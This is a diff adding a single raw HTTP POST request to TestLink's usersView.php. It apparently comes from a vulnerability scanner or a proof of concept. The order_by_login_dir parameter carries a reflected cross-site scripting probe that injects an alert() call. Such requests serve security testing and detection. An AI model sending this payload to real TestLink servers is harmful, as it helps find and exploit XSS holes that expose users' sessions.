@@ -1,0 +1,14 @@
+POST /testlink/lib/usermanagement/usersView.php HTTP/1.0
+
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)
+Host: x.x.x.x
+Content-Length: 146
+Cookie: PHPSESSID=8ea021778858f826c5aab8be8f38868c;TL_lastTestProjectForUserID_1=2381
+Connection: Close
+Pragma: no-cache
+
+operation=order_by_role&amp;order_by_role_dir=asc&amp;order_by_login_dir=1&gt;&quot;&gt;alert(726367128870)%3B&amp;user_order_by=order_by_login
+
+
